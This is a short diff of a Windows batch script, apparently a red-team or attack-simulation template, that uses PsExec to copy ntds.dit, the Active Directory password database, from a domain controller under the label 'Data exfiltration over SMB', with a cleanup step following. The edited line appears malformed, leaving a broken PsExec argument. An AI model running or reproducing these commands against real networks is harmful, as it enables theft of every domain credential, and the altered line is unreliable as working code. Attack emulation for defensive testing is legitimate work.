@@ -105,7 +105,7 @@ PSExec.exe -accepteula -s -d \\dc1.corp.contoso.com cmd.exe
 TIMEOUT /T 120
 
 rem **Data exfiltration over SMB (PUT YOUR DOMAIN CONTROLLER HERE)
-PSExec.exe -accepteula -s -d \\dc1.corp.contoso.com cmd /c esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
+PSExec.exe -accepteula -s -\\dc1.corp.contoso.com esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
 TIMEOUT /T 120
 
 rem ** Cleanup ** (PUT YOUR DOMAIN CONTROLLER HERE)
